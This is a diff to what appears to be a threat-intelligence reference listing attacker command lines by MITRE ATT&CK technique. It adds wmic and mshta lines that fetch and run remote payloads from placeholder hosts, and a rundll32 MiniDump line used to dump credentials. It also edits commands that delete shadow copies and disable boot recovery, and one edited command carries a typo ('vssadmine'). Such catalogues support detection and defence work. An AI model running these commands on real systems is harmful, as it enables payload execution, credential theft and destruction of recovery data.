@@ -368,6 +368,7 @@ Get-CimInstance -ClassName Win32_ComputerSystem
 Get-WmiObject win32_processor
 Get-WmiObject CIM_PhysicalMemory
 Get-WmiObject –ComputerName <host> –Class Win32_ComputerSystem | Select-Object UserName
+wmic.exe os get /FORMAT:”http://<IP_address>:<port>/ <file_name>.exe”
 ```
 
 Device Driver Discovery [[T1652](https://attack.mitre.org/techniques/T1652/)]
@@ -437,11 +438,11 @@ netsh advfirewall firewall add rule name= "Open Port 3389" dir=in action=allow p
 Inhibit System Recovery [[T1490](https://attack.mitre.org/techniques/T1490/)]
 
 ```
-"WMIC.exe" shadowcopy delete
+wmic shadowcopy delete
 powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject
-"vssadmin.exe" delete shadows /all /quiet
-"bcdedit.exe" /set {default} recoveryenabled No
-"bcdedit.exe" /set {default} bootstatuspolicy ignoreallfailures
+vssadmine delete shadows /all /quiet
+bcdedit /set {default} recoveryenabled No
+bcdedit /set {default} bootstatuspolicy ignoreallfailures
 ```
 
 Software Discovery: Security Software Discovery [[T1518.001](https://attack.mitre.org/techniques/T1518/001/)]
@@ -475,4 +476,17 @@ Obfuscated Files or Information [[T1027](https://attack.mitre.org/techniques/T10
 
 ```
 PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand <Base64_encoded_string>
+```
+
+System Binary Proxy Execution: Rundll32 [[T1218.011](https://attack.mitre.org/techniques/T1218/011/)]
+
+```
+rundll32 comsvcs.dll,MiniDump <PID> <file_name>.bin full
+```
+
+System Binary Proxy Execution: Mshta [[T1218.005](https://attack.mitre.org/techniques/T1218/005/)]
+
+```
+mshta.exe vbscript:(CreateObject("WScript.Shell").Run("<file_name>.exe",0)) (Window.Close)
+mshta.exe http[:]//<IP_address>/<file_name>.hta
 ```
